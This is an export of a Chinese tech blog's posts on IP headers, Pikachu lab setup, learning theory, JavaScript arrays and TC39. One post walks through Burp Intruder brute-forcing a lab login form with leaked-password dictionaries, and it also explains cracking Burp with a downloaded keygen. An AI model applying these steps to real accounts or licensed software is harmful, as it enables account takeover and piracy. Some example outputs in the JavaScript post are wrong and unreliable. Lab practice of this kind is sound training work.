<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TCP/IP 学习笔记 | IP：网际协议</title>
      <link href="/2020/02/25/046_TCPIP_IP/"/>
      <url>/2020/02/25/046_TCPIP_IP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="IP：网际协议"><a href="#IP：网际协议" class="headerlink" title="IP：网际协议"></a>IP：网际协议</h2><p><code>IP (Internet Protocol)</code> 是 <code>TCP/IP</code> 协议族中最为核心的协议。所有的 <code>TCP</code>、<code>UDP</code>、<code>ICMP</code> 及 <code>IGMP</code> 数据都以 <code>IP</code> 数据报格式传输的。</p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ol><li><p>不可靠 <code>(unreliable)</code><br><code>IP</code> 大哥牛皮哄哄地说：“我只管寄包裹，传得到传不到我不管，但是如果没传成功，我儿子 <code>ICMP</code> 会通知你。想要可靠，你还是找我另一个儿子 <code>TCP</code> 吧。”</p></li><li><p>无连接 <code>(connectionless)</code><br><code>IP</code> 大哥喝了口茶，又说：“每个包裹我都会分开来寄，你别管我每个包裹走哪条路线，我也不保证哪个包裹先送到。”</p></li></ol><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>首先，我们先抓个包看看，一个完整的数据包是怎样的：</p><img src="/2020/02/25/046_TCPIP_IP/wireshark_ip.jpg"><pre><code>&#39;&#39;&#39; 这 61 Bytes 的数据就是完整的数据包结构了-------------------------------------------------------------------------0000   02 00 00 00 45 00 00 39 00 00 40 00 40 06 00 00   ....E..9..@.@...0010   7f 00 00 01 7f 00 00 01 c1 69 0b b8 00 53 40 d6   .........i...S@.0020   48 1d d8 7d 80 18 18 eb fe 2d 00 00 01 01 08 0a   H..}.....-......0030   19 a1 d3 45 19 a1 d3 45 48 65 6c 6c 6f            ...E...EHello</code></pre><p>我们像剥洋葱一样，将它一层一层剥开来分析。</p><pre><code>&#39;&#39;&#39; 瞅瞅，最前面这一层 4 Bytes 的数据是 Mac 帧头，是链路层的数据结构它说明了我们数据包走的是 Loopback 网卡-------------------------------------------------------------------------0000   02 00 00 00                                       ....</code></pre><pre><code>&#39;&#39;&#39; 这一层 20 Bytes 的数据就是 IP 头，是网络层的数据结构它描述了这个包从哪来到哪去，家里有几口人，人均几亩地（咳咳）-------------------------------------------------------------------------0000   45 00 00 39 00 00 40 00 40 06 00 00 7f 00 00 01   E..9..@.@.......0010   7f 00 00 01                                       ....</code></pre><pre><code>&#39;&#39;&#39; 这一层是 TCP 头，是传输层的数据结构-------------------------------------------------------------------------0000   c1 69 0b b8 00 53 40 d6 48 1d d8 7d 80 18 18 eb   .i...S@.H..}....0010   fe 2d 00 00 01 01 08 0a 19 a1 d3 45 19 a1 d3 45   .-.........E...E</code></pre><pre><code>&#39;&#39;&#39; 最后包裹拆完就是传输的核心数据啦，下面是我们经过 utf8 编码的字符串数据 Hello-------------------------------------------------------------------------0000   48 65 6c 6c 6f                                    Hello</code></pre><p>下面有请主角 IP 协议，我们看看 IP 头的定义是怎样的：</p><img src="/2020/02/25/046_TCPIP_IP/ip_header.jpg"><p>从图中可以看出，IP头一般是 20 Bytes，包的总大小不超过 64 KB，下面介绍一下每部分的含义：</p><ol><li><p><code class="api-param-key">Version</code><code class="api-param-value">4bit</code><br>协议版本号，例如 IPv4 的版本号为 4</p></li><li><p><code class="api-param-key">Header Length</code><code class="api-param-value">4bit</code><br>首部长度，32bit 的数量，一般情况下值为 0101b，即 5x4=20B，最大 1111b，即 60B</p></li><li><p><code class="api-param-key">TOS | DSCP</code><code class="api-param-value">8bit</code> <code>(Type of Service)</code><br>服务类型，前 3bit 优先级字段（现已忽略），后 4bit 分别代表：最小时延、最大吞吐量、最高可靠性和最小费用，且只能置其中 1bit。如果所有 4bit 均为 0，那么就意味着是一般服务。最后 1bit 为保留字段。如下图所示：</p><img src="/2020/02/25/046_TCPIP_IP/tos.png"><p>后来在 <code>RFC2474</code> 中又重新对 <code>TOS</code> 进行了划分，即 Differentiated Services Field Codepoints，简称 <code>DSCP</code>。</p></li><li><p><code class="api-param-key">Total Length</code><code class="api-param-value">16bit</code><br>IP 包总长，单位 Bytes，长度 16bit，因此 IP 包的最大长度为 2^16-1 = 65535B，上面抓包的例子中 IP 包总长为 57B。</p></li><li><p><code class="api-param-key">ID</code><code class="api-param-value">16bit</code> <code>(Identification)</code><br>标识字段，相当于 <code>IP</code> 数据报的 <code>ID</code>，通常每发送一份报文它的值就会加 1。如果因为数据大于链路层 <code>MTU</code> 导致IP数据报分段 <code>(Fragment)</code> 的话，则每个分段的 <code>IP</code> 数据报的标识都是一样的。<br>从我本地抓包结果看，从本机发往外部 <code>IP</code> 的 <code>TCP</code> 包，这个字段恒为 0，有大神可以解释么？</p></li><li><p><code class="api-param-key">Flags</code><code class="api-param-value">3bit</code><br>该字段第一位不使用。第二位是 <code>DF (Don&#39;t Fragment)</code> 位，<code>DF</code> 位设为 1 时表明路由器不能对该上层数据包分段。如果一个上层数据包无法在不分段的情况下进行转发，则路由器会丢弃该上层数据包并返回一个错误信息。第三位是 <code>MF (More Fragments)</code> 位，当路由器对一个上层数据包分段，则路由器会在除了最后一个分段的IP包的包头中将 <code>MF</code> 位设为 1。</p></li><li><p><code class="api-param-key">Offsets</code><code class="api-param-value">13bit</code><br>位偏移，用于分段后标志该 <code>IP</code> 数据报相对原来数据报的偏移量。以 8 个字节为偏移单位，也就是说，每个分片的长度一定是 <code>8B (64bit)</code> 的整数倍。</p></li><li><p><code class="api-param-key">TTL</code><code class="api-param-value">8bit</code> <code>(Time to Live)</code><br>生存时间，标识了可以经过的最多路由器数，<code>TTL</code> 的初始值由源主机设置（通常为 32 或 64），一旦经过一个处理它的路由器，它的值就减去 1。当该字段的值为 0 时，数据报就被丢弃，并发送 <code>ICMP</code> 报文通知源主机。</p></li><li><p><code class="api-param-key">Protocol</code><code class="api-param-value">8bit</code><br>协议，常用的有：<code>ICMP(1)、TCP(6)、UDP(17)</code>，详细清单见 <a href="https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers" target="_blank" rel="noopener">维基百科</a></p></li><li><p><code class="api-param-key">Header Checksum</code><code class="api-param-value">8bit</code><br>首部校验，根据 <code>IP</code> 首部计算的检验和码，它不对首部后面的数据进行计算。如果校验失败则丢弃该数据报，但不会跟 <code>TTL</code> 为 0 时一样发送 <code>ICMP</code> 报文，而是交给上层协议发现数据丢失进行重传。</p></li><li><p><code class="api-param-key">Source &amp; Destination Address</code><code class="api-param-value">2 x 32bit</code><br>源地址和目标地址，例如 <code>7f 00 00 01</code> 表示 <code>127.0.0.1</code>。要注意除非使用NAT，否则整个传输的过程中，这两个地址不会改变。</p></li><li><p><code class="api-param-key">Options</code><code class="api-param-value">2 x 32bit</code><br>可选项，是数据报中的一个可变长的可选信息，主要用于测试。目前，这些任选项定义如下：<br>• 安全和处理限制（用于军事领域，详细内容参见RFC 1108[Kent 1991]）<br>• 记录路径（让每个路由器都记下它的IP地址，见7.3节）<br>• 时间戳（让每个路由器都记下它的IP地址和时间，见7.4节）<br>• 宽松的源站选路（为数据报指定一系列必须经过的IP地址，见8.5节）<br>• 严格的源站选路（与宽松的源站选路类似，但是要求只能经过指定的这些地址，不能经过其他的地址）。</p></li></ol><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><ol><li><p>电子书下载：<a href="https://github.com/zxysilent/books/blob/master/TCP-IP%E8%AF%A6%E8%A7%A3%E5%8D%B71%EF%BC%9A%E5%8D%8F%E8%AE%AE.pdf" target="_blank" rel="noopener">《TCP/IP详解 卷一：协议》</a></p></li><li><p>TCP/IP 协议族图解：</p></li></ol><img src="/2020/02/25/046_TCPIP_IP/tcpip_protocal.png">]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP/IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp 表单爆破（附安装教程）</title>
      <link href="/2020/02/19/045_Blasting/"/>
      <url>/2020/02/19/045_Blasting/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文仅供学习参考，严禁用于非法用途</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="Pikachu-靶场搭建"><a href="#Pikachu-靶场搭建" class="headerlink" title="Pikachu 靶场搭建"></a>Pikachu 靶场搭建</h3><p>Pikachu 是一个用于 Web 渗透测试的靶场，具体细节及安装可以参考我上一篇博客：<a href="https://vincentstudio.info/2020/02/19/044_Pikachu_installation/">《Web 漏洞靶场 Pikachu 简介》</a></p><h3 id="Burp-安装"><a href="#Burp-安装" class="headerlink" title="Burp 安装"></a>Burp 安装</h3><p>Burp Suite 是用于攻击 web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p><ul><li><p>依赖 <a href="https://www.oracle.com/java/technologies/javase-downloads.html" target="_blank" rel="noopener">JDK 1.8</a>，高版本可能注册失败</p></li><li><p><a href="https://portswigger.net/burp/communitydownload" target="_blank" rel="noopener">官网下载最新版</a> &amp; 安装</p></li></ul><h3 id="Burp-破解"><a href="#Burp-破解" class="headerlink" title="Burp 破解"></a>Burp 破解</h3><ul><li><p><a href="https://pan.baidu.com/s/1k-TTAVe-OdOIWSMvvVdSNA" target="_blank" rel="noopener">注册机百度云下载</a> 密码:i37h</p></li><li><p>注册机下载后解压到安装目录</p></li></ul><pre><code class="lang-bash">$ pwd/Applications/Burp Suite Community Edition.app/Contents/java/app$ ls -ntotal 55424-rwxr-xr-x@ 1 501  80     65220 Feb 19 15:53 burp-loader-keygen.jardrwxr-xr-x  3 501  80        96 Feb 19 15:51 burpbrowser-rw-r--r--  1 501  80  28215285 Feb 19 15:53 burpsuite_community.jar</code></pre><ul><li>运行注册机</li></ul><pre><code class="lang-bash">$ java -jar ./burp-loader-keygen.jar</code></pre><ul><li><p>点击 <code>Run</code>，选择手动激活，拷贝请求数据到注册机，拷出算号结果，完成注册。</p></li><li><p>正常激活后每次启动都需要通过 <code>burp-loader-keygen.jar</code> 启动，可以添加一条 <code>alias</code>，简化启动</p></li></ul><pre><code class="lang-bash">DIR_BURP=&quot;/Applications/Burp\ Suite\ Community\ Edition.app/Contents/java/app&quot;alias burp=&quot;java -Xbootclasspath/p:$DIR_BURP/burp-loader-keygen.jar -jar $DIR_BURP/burpsuite_community.jar&quot;</code></pre><h3 id="爆破字典"><a href="#爆破字典" class="headerlink" title="爆破字典"></a>爆破字典</h3><pre><code class="lang-bash">$ git clone https://github.com/rootphantomer/Blasting_dictionary.git</code></pre><p>这个仓库里有一些常用字典，目录如下</p><pre><code class="lang-bash">-rwxr-xr-x   1 501  20     2344 Nov 14  2017 3389爆破字典.txt-rwxr-xr-x   1 501  20     5176 Nov 14  2017 NT密码.txt-rwxr-xr-x   1 501  20       35 Nov 14  2017 README.mddrwxr-xr-x   4 501  20      128 Nov 14  2017 a5+pudn源代码目录103W+-rwxr-xr-x   1 501  20     3637 Nov 14  2017 baopo.py-rwxr-xr-x   1 501  20       54 Nov 14  2017 big_dictionary.txt-rwxr-xr-x   1 501  20      500 Nov 14  2017 jiahouzhui.py-rwxr-xr-x   1 501  20    18284 Nov 14  2017 liunx_users_dictionaries.txt-rwxr-xr-x   1 501  20     8846 Nov 14  2017 renkoutop.txt-rwxr-xr-x   1 501  20     1015 Nov 14  2017 top100password.txt-rwxr-xr-x   1 501  20  9273839 Nov 14  2017 top10W.txt-rwxr-xr-x   1 501  20    22534 Nov 14  2017 top500姓名组合.txt-rwxr-xr-x   1 501  20      134 Nov 14  2017 weblogic默认密码列表.txt-rwxr-xr-x   1 501  20   144194 Nov 14  2017 webshellPassword.txtdrwxr-xr-x  14 501  20      448 Nov 14  2017 目录-rwxr-xr-x   1 501  20     2107 Nov 14  2017 字典.txt-rwxr-xr-x   1 501  20    40710 Nov 14  2017 后台路径.txt-rwxr-xr-x   1 501  20    62027 Nov 14  2017 常用密码.txt-rwxr-xr-x   1 501  20   174888 Nov 14  2017 渗透字典.txt-rwxr-xr-x   1 501  20    17830 Nov 14  2017 突破密码.txt-rwxr-xr-x   1 501  20     1101 Nov 14  2017 装机密码.txtdrwxr-xr-x   6 501  20      192 Nov 14  2017 美国人字典-rwxr-xr-x   1 501  20    71357 Nov 14  2017 常用用户名.txt-rwxr-xr-x   1 501  20    10197 Nov 14  2017 数据库地址.txtdrwxr-xr-x   4 501  20      128 Nov 14  2017 撞库邮箱和密码-rwxr-xr-x   1 501  20     1616 Nov 14  2017 自己收集的密码.txtdrwxr-xr-x   3 501  20       96 Nov 14  2017 各类黑客大牛后门密码drwxr-xr-x   4 501  20      128 Nov 14  2017 常用英文用户名和奇葩密码</code></pre><p>以上工具准备齐全了，就可以进入我们的正题了</p><h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><p>首先在 <code>Proxy &gt; Options &gt; Proxy Listeners</code> 可以看到默认的代理设置在本地 8080 端口，因此我们需要给浏览器设置 <code>HTTP</code> 代理。</p><p>为了和我正常 <code>Chrome</code> 使用环境隔离开，我使用 <code>Firefox</code> 作为我的测试浏览器。但是 <code>Firefox</code> 默认本地流量不会走代理，所以我们还需要另外设置一下。</p><ol><li><code>Firefox</code> 打开 <code>about:config</code></li><li>搜索 <code>network.proxy.allow_hijacking_localhost</code></li><li>双击该项，将其值改为 <code>ture</code>，允许 <code>localhost</code> 劫持</li></ol><h2 id="开始爆破"><a href="#开始爆破" class="headerlink" title="开始爆破"></a>开始爆破</h2><p>输入用户名密码 <code>admin/admin</code>，然后就能抓到 <code>/bf_form.php</code> 请求了，直接右键 <code>Send to Intruter</code></p><img src="/2020/02/19/045_Blasting/burp_proxy.jpg"><p>在 <code>Intruder &gt; Position</code> 里就能看到刚才发过来的请求，我们这里使用 <code>Cluster Bomb</code> 模式，设置 <code>username</code> 和 <code>password</code> 两个变量</p><img src="/2020/02/19/045_Blasting/intruder.jpg"><p>在 <code>Interuder &gt; Payloads</code> 里配置这两个参数。<code>Payload set 1</code> 是 <code>username</code>，<code>2</code> 是 <code>password</code>，为了缩短测试时间，我们用户名只添加了 <code>admin</code> 和 <code>root</code></p><img src="/2020/02/19/045_Blasting/payloads_1.jpg"><p>密码把爆破字典里的【常用密码.txt】加载进来</p><img src="/2020/02/19/045_Blasting/payloads_2.jpg"><p>点击 <code>Start Attack</code> 开始爆破，结果按 <code>Content Length</code> 筛选一下，找到正确的账户 <code>admin/123456</code></p><img src="/2020/02/19/045_Blasting/result.jpg">]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web 漏洞靶场 Pikachu 简介</title>
      <link href="/2020/02/19/044_Pikachu_installation/"/>
      <url>/2020/02/19/044_Pikachu_installation/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>“如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它”。 —— Pikachu 作者 <a href="https://github.com/zhuifengshaonianhanlu" target="_blank" rel="noopener">zhuifengshaonianhanlu</a></p></blockquote><img src="/2020/02/19/044_Pikachu_installation/pikachu.jpg"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这是一个用于 Web 渗透测试的靶场，<code>php + mysql</code> 搭建。适合练手，安装简单。项目地址：<a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" rel="noopener">传送门</a></p><h3 id="漏洞列表"><a href="#漏洞列表" class="headerlink" title="漏洞列表"></a>漏洞列表</h3><ul><li>Burt Force(暴力破解漏洞)</li><li>XSS(跨站脚本漏洞)</li><li>CSRF(跨站请求伪造)</li><li>SQL-Inject(SQL注入漏洞)</li><li>RCE(远程命令/代码执行)</li><li>Files Inclusion(文件包含漏洞)</li><li>Unsafe file downloads(不安全的文件下载)</li><li>Unsafe file uploads(不安全的文件上传)</li><li>Over Permisson(越权漏洞)</li><li>../../../(目录遍历)</li><li>I can see your ABC(敏感信息泄露)</li><li>PHP反序列化漏洞</li><li>XXE(XML External Entity attack)</li><li>不安全的URL重定向</li><li>SSRF(Server-Side Request Forgery)</li><li>管理工具</li><li>More…(找找看?..有彩蛋!)</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code class="lang-bash">docker pull area39/pikachudocker run -d -p 7001:80 area39/pikachu</code></pre><p>打开页面 127.0.0.1:7001，按照提示初始化一下即可。 Happy hacking ~</p>]]></content>
      
      
      <categories>
          
          <category> Toolkit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习的底层原理</title>
      <link href="/2020/02/17/043_Theory_of_mental_calculation/"/>
      <url>/2020/02/17/043_Theory_of_mental_calculation/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="什么是学习？"><a href="#什么是学习？" class="headerlink" title="什么是学习？"></a>什么是学习？</h2><blockquote><p>学习是一个系统为了适应环境而形成的一种长久的变化，通过这种长久的变化系统能够在下一次更有效的完成同类的工作。 —— 赫伯特·西蒙</p></blockquote><p>这里「系统」指心智系统，涵盖包括组织、个人、计算机等对象。</p><h2 id="心智计算理论"><a href="#心智计算理论" class="headerlink" title="心智计算理论"></a>心智计算理论</h2><p>认知心理学的终极结论是心智计算理论。程序 = 数据结构 + 算法，大脑也是如此，心智 = 心理表征 + 计算。心理表征对应一切观念、意向、感受、情绪的内在心理结构。所谓的加工和计算，就是指我们的推理联想、类比这些思维的动作。“人工智能模拟人类的行为，本质上也是模拟的这种表征转化的模式”</p><img src="/2020/02/17/043_Theory_of_mental_calculation/mind.jpg"><p>记忆分为两类， <span class="highlight">工作记忆</span> 和 <span class="highlight">长时记忆</span>。工作记忆中的统统都是心理表征，如果我们的心智是一个心灵剧场，工作记忆就是我们的舞台，中央执行系统就是舞台总监。舞台是有限大的，可以容纳几个演员，但是后台（长时记忆）是无限大的，大量的演员是距离舞台很远的，经常错过演出。</p><h3 id="什么决定了演出的水平？"><a href="#什么决定了演出的水平？" class="headerlink" title="什么决定了演出的水平？"></a>什么决定了演出的水平？</h3><ol><li>舞台调度能力（工作记忆）</li><li>演员的质量（长时记忆）</li></ol><h3 id="怎么衡量这两个指标"><a href="#怎么衡量这两个指标" class="headerlink" title="怎么衡量这两个指标"></a>怎么衡量这两个指标</h3><ol><li><span class="highlight">流体智力</span> 即一般意义上的智商，决定了我们的计算速度、推理能力、短时记忆力，有生理基础的，成年之后慢慢下降。</li><li><span class="highlight">晶体智力</span> 是长时记忆中的优质的陈述性记忆，其核心是清晰、稳定、准确的 <span class="highlight">概念</span>。</li></ol><h2 id="学习理论"><a href="#学习理论" class="headerlink" title="学习理论"></a>学习理论</h2><blockquote><p>学生是否能习得新信息，主要取决于他们认知结构中已有的有关概念；意义学习是通过新信息与学生认知结构中已有的有关概念相互作用才得以发生。 —— 《意义学习新论》</p></blockquote><h3 id="学习的几个阶段"><a href="#学习的几个阶段" class="headerlink" title="学习的几个阶段"></a>学习的几个阶段</h3><p><span class="highlight">表征</span> 学习，从刺激到符号<br><span class="highlight">概念</span> 学习，从符号到类别<br><span class="highlight">命题</span> 学习，概念间关系<br><span class="highlight">理论</span> 学习，命题组成理论</p><p>最重要的事概念，因为表征太普遍了，只有概念才能让我们恰到好处的归纳和整理世界，它也是命题和理论的基础，概念的稳定性决定了整个思维框架的稳定性。</p><img src="/2020/02/17/043_Theory_of_mental_calculation/cognitive_structure.jpg"><p>教育心里学中有一个六阶段理论，其中有一个阶段 “新信息进入原有命题网络”，这就相当于第四个阶段。</p><h3 id="新概念与老概念的关系"><a href="#新概念与老概念的关系" class="headerlink" title="新概念与老概念的关系"></a>新概念与老概念的关系</h3><ol><li>下位关系，老概念囊括新概念，例如晶体智力就是对智力的修补。</li><li>上位关系，老概念支撑新概念的建立，例如苹果、菠萝、梨子和水果的概念。</li><li>并列关系，类比。</li></ol><h3 id="影响学习能力的因素"><a href="#影响学习能力的因素" class="headerlink" title="影响学习能力的因素"></a>影响学习能力的因素</h3><p>关键性概念的稳定性和清晰度决定了学习能力。现在的很多概念都是被严重污染过的，在这些幽灵概念和现有概念发生关系之前，他们就是垃圾，是跑龙套的演员。</p><h2 id="多元思维理论"><a href="#多元思维理论" class="headerlink" title="多元思维理论"></a>多元思维理论</h2><p>思维模型的本质是由特定的概念、命题和理论所构成的长时的陈述性记忆。</p><img src="/2020/02/17/043_Theory_of_mental_calculation/model.jpg"><p>什么是多元呢？多元指的是你有足够多的健壮的、清晰的、稳定的由各类概念明天和理论所构成的陈述性记忆，他们能从不同的角度让你分层次地去把把握和理解这个世界的规律，这就是晶体智力的内涵。同一个现象你看起来像不知所云，但是透过某种理论的晶体看起就是规律。所以，与其说一个人看待问题的视角很特别，不如说他记住了足够多的概念和命题来陈述这件事情。那么怎么能够记住呢？</p><h3 id="刻意练习"><a href="#刻意练习" class="headerlink" title="刻意练习"></a>刻意练习</h3><p>《刻意练习》是安德斯·埃里克森提出的概念。它里面特意提到，刻意练习的关键就是要创建特定的心里表征，这些表征是信息预先存在的模式，这些模式保存在长时记忆中，可以用于有效且快速的顺应某些类型的局面，对于所有心理表征有一点是相同的，尽管短时记忆存在局限，但他们使得人们可以迅速地处理大量的信息。事实上人们可以把心理表征定义为一个“概念式的结构设计”，用于回避短时记忆的局限。一言以蔽之，刻意练习就是把这些东西放进长时记忆的一个动作，并且让长时记忆能够迅速地拉回工作记忆。具体应该怎么做呢？</p><ol><li>明确任务的输入和输出（决定稳定性）</li><li>用大量例子重塑大脑连接（决定清晰度）</li></ol><p>再回到开头提到的学习的本质。”学习是一个系统为了适应环境而形成的一种长久的变化，通过这种长久的变化系统能够在下一次更有效的完成「同类」的工作“。为什么高手总是能举一反三、触类旁通？因为他脑子里的关键理论的晶体都是粗壮的大逻辑，所以总是能够找到共性和规律。</p><h3 id="对比反馈"><a href="#对比反馈" class="headerlink" title="对比反馈"></a>对比反馈</h3><p>”对比反馈“是最好的学习方法之一。它的核心原理就在于通过对比，你让80%的东西变得不重要了，最大体量的那个东西变得不重要了，剩下的20%的差距马上就出来了，因为简单的东西是不重要的，但是它很惹眼。复杂的东西是很细微的，但是它很重要，你让细微的东西体现出来之后，你就练细微的东西，练这20%。</p>]]></content>
      
      
      <categories>
          
          <category> Methodology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thoughts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript Array 方法总结</title>
      <link href="/2020/02/12/042_Javascript_Array/"/>
      <url>/2020/02/12/042_Javascript_Array/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="堆栈-amp-队列"><a href="#堆栈-amp-队列" class="headerlink" title="堆栈 &amp; 队列"></a>堆栈 &amp; 队列</h2><ul><li><span class="highlight">push</span> 添加到末尾，返回修改后的长度</li><li><span class="highlight">pop</span> 移除最后一项，返回移除的项</li><li><span class="highlight">unshift</span> 添加到前端，返回修改后的长度</li><li><span class="highlight">shift</span> 移除第一项，取得数组第一项</li></ul><p><code>push</code> 和 <code>unshift</code> 支持插入多个元素，如下</p><pre><code class="lang-javascript">arr.push(1, 2, 3);arr.unshift(1, 2, 3);</code></pre><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><ul><li><span class="highlight">indexOf</span> 传入 <code>value</code>，返回 <code>index | -1</code></li><li><span class="highlight">includes</span> 传入 <code>value</code>，返回 <code>boolean</code></li><li><span class="highlight">findIndex</span> 传入 <code>function</code>，返回 <code>index | -1</code></li><li><span class="highlight">find</span> 传入 <code>function</code>，返回 <code>value | undefined</code></li></ul><h2 id="重排序"><a href="#重排序" class="headerlink" title="重排序"></a>重排序</h2><ul><li><span class="highlight">reverse</span> 反转数组，返回反转后的数组</li><li><span class="highlight">sort</span> 默认按升序排列, 返回排序后的数组</li></ul><p><code>cmp</code> 函数返回值 &lt; 0 靠前，&gt; 0 靠后</p><pre><code class="lang-javascript">[2, 1, 3].sort((a, b) =&gt; a - b); // @return: [1, 2, 3] 等价于 [2,1,3].sort()[{v:2}, {v:1}, {v:3}].sort((a, b) =&gt; b.v - a.v); // @return: [{v:2}, {v:1}, {v:1}]</code></pre><h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><ul><li><span class="highlight">slice</span> 返回新数组，可用值拷贝 <code>slice(0)</code><ul><li><code>slice (start, end)</code>: 返回 <code>start</code> 到 <code>end</code> 位置的项（不包括结束位置）</li><li><code>slice (start)</code> <code>start</code>: 位置到末尾的所有项</li></ul></li><li><span class="highlight">splice</span> 返回被删除的项<ul><li><code>splice (start, count)</code>: 从 <code>start</code> 位置开始删除 <code>count</code> 个项</li><li><code>splice (start, 0, ...inserts)</code>: 从 <code>start</code> 位置开始插入 <code>inserts</code></li><li><code>splice (start, count, ...inserts)</code>: 先删再插</li></ul></li></ul><p>注意，<code>slice</code> 返回新数组而原数组不变，而 <code>splice</code> 返回被删除的数组，原数组也会改变。<code>slice</code> 相当于 <code>python</code> 里切片语法，例如 <code>arr[1:3]</code>, <code>arr[-2]</code> 等价于 <code>arr.slice(1, 3)</code>, <code>arr.slice(-2)</code>。</p><pre><code class="lang-javascript">const a = [1, 2, 3];const b = a.slice(-2);// b: [2, 3] 最后2个元素 // a: [1, 2, 3]const c = a.splice(1, 0, 6, 7);// c: [] 没有删除值// a: [1, 6, 7, 2, 3]</code></pre><h2 id="迭代方法"><a href="#迭代方法" class="headerlink" title="迭代方法"></a>迭代方法</h2><ul><li><span class="highlight">every</span> 每一项返回 <code>true</code> 则返回 <code>ture</code></li><li><span class="highlight">some</span> 任意一项返回 <code>true</code> 则返回 <code>ture</code></li><li><span class="highlight">filter</span> 返回返回 <code>true</code> 的数组</li><li><span class="highlight">map</span> 返回每次函数调用的结果组成的数组</li><li><span class="highlight">forEach</span> 没有返回值, 与 <code>for</code> 类似</li></ul><p>回调参数都是 (item[, index[, array]]), <code>forEach</code> 和 <code>map</code> 执行过程中无法通过 <code>break</code> 或 <code>return</code> 中断，一旦执行就必须执行到末尾，如果需要截断，可以用 <code>some</code> 代替，中断时返回 <code>true</code> 即可。</p><pre><code class="lang-javascript">const a = [1, 2, 3, 6, 4, 5];const b = a.filter(item =&gt; item &lt; 5);// b: [1, 2, 3, 4] 返回小于5的结果// a: [1, 6, 7, 2, 3] 原数组不变const c = a.some(item =&gt; {    console.log(item);    return item &gt; 4;})// log: 1, 2, 3, 6 找到 6 时返回 true，中断循环// c: true 找到结果</code></pre><h2 id="归并方法"><a href="#归并方法" class="headerlink" title="归并方法"></a>归并方法</h2><ul><li><span class="highlight">reduce</span> 累积所有，返回累积的结果</li><li><span class="highlight">reduceRight</span> 从后向前累积</li></ul><p>arr.reduce(callback(accumulator, currentValue[, index[, array]])[, initialValue])</p><pre><code class="lang-javascript">const arr = [{ n: 1 }, { n: 2 }, { n: 3  }];const data = { v: 2, sum: 0 };arr.reduce((acc, cur) =&gt; (acc.sum += cur.n, acc), data);// return: { v: 2, sum: 6 }</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">Array - Javascript | MDN</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FrontEnd </tag>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TC39 与 ECMAScript 提案</title>
      <link href="/2020/02/09/041_TC39_and_ECMAScript/"/>
      <url>/2020/02/09/041_TC39_and_ECMAScript/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="TC39-是什么？"><a href="#TC39-是什么？" class="headerlink" title="TC39 是什么？"></a>TC39 是什么？</h2><p>TC39 全称 Ecma International, Technical Committee 39（ECMA国际技术委员会39)，是制定 ECMA-262 号标准制的组织，由各个主流浏览器厂商的代表构成。</p><p>可能有些小伙伴会有点懵逼，Ecma International 是什么？TC39 为啥是39，而不是 TC38，39代表着什么？ECMA-262 又是啥，它跟 ECMAScript 又有什么关系？ECMAScript 跟 Javascript 又有什么关系？下面我就来整理了一下。</p><h2 id="Ecma-International"><a href="#Ecma-International" class="headerlink" title="Ecma International"></a>Ecma International</h2><p>以下摘自维基百科：</p><blockquote><p>Ecma国际（英语：Ecma International）是一家国际性会员制度的信息和电信标准组织。1994年之前，名为欧洲计算机制造商协会（European Computer Manufacturers 